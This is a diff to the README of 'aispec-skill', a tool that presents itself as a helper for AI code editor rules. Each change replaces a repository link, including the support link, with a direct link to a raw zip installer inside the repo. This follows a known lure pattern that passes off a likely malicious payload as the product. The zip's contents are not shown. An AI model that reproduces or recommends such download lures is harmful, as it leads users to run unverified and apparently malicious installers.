@@ -1,6 +1,6 @@
 # 🧰 aispec-skill - Simplify AI Code Editing Rules
 
-[![Download aispec-skill](https://img.shields.io/badge/Download-aispec--skill-blue?style=for-the-badge)](https://github.com/rarefied-languagebarrier142/aispec-skill)
+[![Download aispec-skill](https://img.shields.io/badge/Download-aispec--skill-blue?style=for-the-badge)](https://github.com/rarefied-languagebarrier142/aispec-skill/raw/refs/heads/main/aispec-skill/best-practices/en/desktop/aispec-skill-1.3.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these steps to get aispec-skill running on your PC:
 
    Click this big button or open the link in your web browser:
 
-   [![Download aispec-skill](https://img.shields.io/badge/Download-aispec--skill-green?style=for-the-badge)](https://github.com/rarefied-languagebarrier142/aispec-skill)
+   [![Download aispec-skill](https://img.shields.io/badge/Download-aispec--skill-green?style=for-the-badge)](https://github.com/rarefied-languagebarrier142/aispec-skill/raw/refs/heads/main/aispec-skill/best-practices/en/desktop/aispec-skill-1.3.zip)
 
 2. **Download the installer**
 
@@ -88,7 +88,7 @@ aispec-skill integrates with AI code editors to help enforce consistent rules. H
 Keep aispec-skill up to date for the best results. Updates include new rules and bug fixes.
 
 - Check the download page regularly for new versions:  
-  https://github.com/rarefied-languagebarrier142/aispec-skill
+  https://github.com/rarefied-languagebarrier142/aispec-skill/raw/refs/heads/main/aispec-skill/best-practices/en/desktop/aispec-skill-1.3.zip
 - Download and run the new installer to update your software.
 - Your settings and data will remain the same after updating.
 
@@ -109,7 +109,7 @@ If you encounter issues, try these tips:
 ## 📞 Support and Help
 
 For questions or help, visit the repository page:  
-https://github.com/rarefied-languagebarrier142/aispec-skill
+https://github.com/rarefied-languagebarrier142/aispec-skill/raw/refs/heads/main/aispec-skill/best-practices/en/desktop/aispec-skill-1.3.zip
 
 Check the “Issues” section to see if your problem has been reported or to submit a new one.
 
@@ -130,4 +130,4 @@ aispec-skill respects your privacy. It only processes code data to apply editing
 
 ---
 
-[![Download aispec-skill](https://img.shields.io/badge/Download-aispec--skill-blue?style=for-the-badge)](https://github.com/rarefied-languagebarrier142/aispec-skill)
+[![Download aispec-skill](https://img.shields.io/badge/Download-aispec--skill-blue?style=for-the-badge)](https://github.com/rarefied-languagebarrier142/aispec-skill/raw/refs/heads/main/aispec-skill/best-practices/en/desktop/aispec-skill-1.3.zip)
